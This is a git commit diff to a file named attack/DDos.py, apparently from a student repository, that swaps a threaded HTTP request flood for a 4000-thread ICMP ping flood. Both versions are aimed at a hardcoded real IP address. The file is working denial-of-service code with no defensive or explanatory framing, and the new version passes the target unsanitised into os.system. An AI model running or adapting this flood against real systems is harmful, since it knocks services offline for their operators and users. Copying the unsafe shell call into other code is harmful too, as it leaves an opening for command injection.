c4d6a820464cbb2667a8fb6c13e3a0e8c1576ea5
Veerapat <veerapat.p66@rsu.ac.th>
2025-10-25 23:22:09 +0700

    icmpFlood portscanworkingfine

--- attack/DDos.py
+++ attack/DDos.py
@@ -1,20 +1,42 @@
-import requests
+# import requests
+# import threading
+
+# target = "http://64.23.233.33"
+# num_threads = 1000
+
+# def attack():
+#     while True:
+#         try:
+#             r = requests.get(target)
+#             print(f"Status: {r.status_code}")
+#         except Exception as e:
+#             print(f"Error: {e}")
+
+# for i in range(num_threads):
+#     t = threading.Thread(target=attack)
+#     t.daemon = True
+#     t.start()
+
+# input("Press Enter to stop...\n")
+import os
 import threading
 
-target = "http://64.23.233.33:3000"
-num_threads = 1000
+target = "64.23.233.33"   # กำหนด IP หรือ hostname
+num_threads = 4000       # จำนวนเธร็ดที่จะสร้าง
 
-def attack():
+def ping():
     while True:
         try:
-            r = requests.get(target)
-            print(f"Status: {r.status_code}")
+            os.system(f"ping -c 1 {target}")
         except Exception as e:
             print(f"Error: {e}")
 
 for i in range(num_threads):
-    t = threading.Thread(target=attack)
+    t = threading.Thread(target=ping)
     t.daemon = True
     t.start()
-
-input("Press Enter to stop...\n")
+try:
+    while True:
+        pass
+except KeyboardInterrupt:
+    print("Stopping all threads...")
